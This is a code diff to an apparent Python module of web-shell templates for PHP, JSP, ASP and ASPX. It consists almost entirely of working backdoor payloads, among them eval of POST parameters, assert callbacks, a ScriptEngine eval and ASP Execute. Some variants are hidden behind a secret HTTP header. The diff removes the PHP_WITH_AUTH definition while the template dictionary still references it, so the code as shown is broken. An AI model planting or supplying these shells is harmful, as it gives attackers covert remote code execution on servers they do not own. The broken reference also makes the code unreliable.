@@ -9,8 +9,6 @@ All templates support placeholders:
 
 """Webshell templates for various languages and authentication methods"""
 
-# PHP Templates
-
 
 PHP_DEFAULT = """@eval($_POST["{{PASSWORD}}"]);"""
 
@@ -26,8 +24,6 @@ PHP_CALLBACK = """array_map("assert",(array)$_POST["{{PASSWORD}}"]);"""
 
 PHP_ONE_LINER = """eval($_POST[{{PASSWORD}}]);"""
 
-# PHP with authentication header
-PHP_WITH_AUTH = """if(isset($_SERVER["HTTP_{{SECRET_HEADER}}"]) && $_SERVER["HTTP_{{SECRET_HEADER}}"] == "{{SECRET_VALUE}}") { @eval($_POST["{{PASSWORD}}"]); }"""
 
 PHP_TEMPLATES = {
     "default": PHP_DEFAULT,
@@ -39,8 +35,6 @@ PHP_TEMPLATES = {
     "one_liner": PHP_ONE_LINER,
     "auth": PHP_WITH_AUTH,
 }
-
-# JSP Templates
 
 JSP_DEFAULT = """<%@page import="java.io.*"%>
 <%
@@ -84,7 +78,6 @@ ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
 engine.eval(request.getParameter("{{PASSWORD}}"));
 %>"""
 
-# JSP with authentication header
 JSP_WITH_AUTH = """<%@page import="java.io.*"%>
 <%
 String authHeader = request.getHeader("{{SECRET_HEADER}}");
@@ -112,8 +105,6 @@ JSP_TEMPLATES = {
     "auth": JSP_WITH_AUTH,
 }
 
-# ASP Templates
-
 ASP_DEFAULT = """<%
 Dim pass,cmd
 pass = "{{PASSWORD}}"
@@ -131,7 +122,6 @@ End If
 
 ASP_EVAL = """<%Execute(Request.Form("{{PASSWORD}}"))%>"""
 
-# ASP with authentication header
 ASP_WITH_AUTH = """<%
 Dim authHeader
 authHeader = Request.ServerVariables("HTTP_{{SECRET_HEADER}}")
@@ -156,8 +146,6 @@ ASP_TEMPLATES = {
     "eval": ASP_EVAL,
     "auth": ASP_WITH_AUTH,
 }
-
-# ASPX Templates
 
 ASPX_DEFAULT = """<%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
@@ -206,7 +194,6 @@ if(cmd != null){
 }
 %>"""
 
-# ASPX with authentication header
 ASPX_WITH_AUTH = """<%@ Page Language="C#" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
